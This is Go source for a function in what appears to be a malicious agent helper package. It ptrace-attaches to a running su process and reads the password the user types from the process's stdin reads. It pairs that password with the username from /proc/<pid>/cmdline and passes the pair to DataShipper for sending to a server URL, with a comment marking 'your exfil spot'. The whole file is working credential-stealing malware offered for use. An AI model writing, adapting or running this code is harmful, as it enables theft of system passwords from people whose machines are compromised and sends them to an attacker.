package agent_helper

import (
	"fmt"
	"os"
	"runtime"
	"strings"
	"syscall"
)

func traceSUProcess(serverUrl string, taskData map[string]interface{}, pid int) {
	runtime.LockOSThread()
	defer runtime.UnlockOSThread()
	err := syscall.PtraceAttach(pid)
	if err != nil {
		return
	}
	defer func() {
		syscall.PtraceDetach(pid)
	}()
	var wstatus syscall.WaitStatus
	var readSyscallCount int
	for {

		_, err := syscall.Wait4(pid, &wstatus, 0, nil)
		if err != nil {
			return
		}

		if wstatus.Exited() {
			return
		}

		var regs syscall.PtraceRegs
		err = syscall.PtraceGetRegs(pid, &regs)
		if err != nil {
			syscall.PtraceDetach(pid)
			return
		}
		if regs.Orig_rax == 0 && regs.Rdi == 0 {
			readSyscallCount++
			if readSyscallCount == 3 {
				buffer := make([]byte, regs.Rdx)
				_, err := syscall.PtracePeekData(pid, uintptr(regs.Rsi), buffer)
				if err != nil {
					return
				}
				if strings.Contains(string(buffer), "\n") {
					cmdline, err := os.ReadFile(fmt.Sprintf("/proc/%d/cmdline", pid))
					if err != nil {
						return
					}
					username := "root"
					if len(cmdline) > 3 {
						parts := strings.Split(string(cmdline), "\x00")
						if len(parts) > 1 {
							username = parts[1]
						} else {
							username = strings.TrimRight(string(cmdline[3:]), "\x00")
						}
						username = RemoveNonPrintableAscii(username)
					}
					password := strings.Split(string(buffer), "\n")[0]
					password = RemoveNonPrintableAscii(password)
					if IsValidPassword(password) {
						// here is your exfil spot
						// go exfilPassword(username, password)
						go DataShipper(serverUrl, taskData, fmt.Sprintf("%v:%v", username, password))
					}
				}
			}
		}
		err = syscall.PtraceSyscall(pid, 0)
		if err != nil {
			return
		}
	}
}
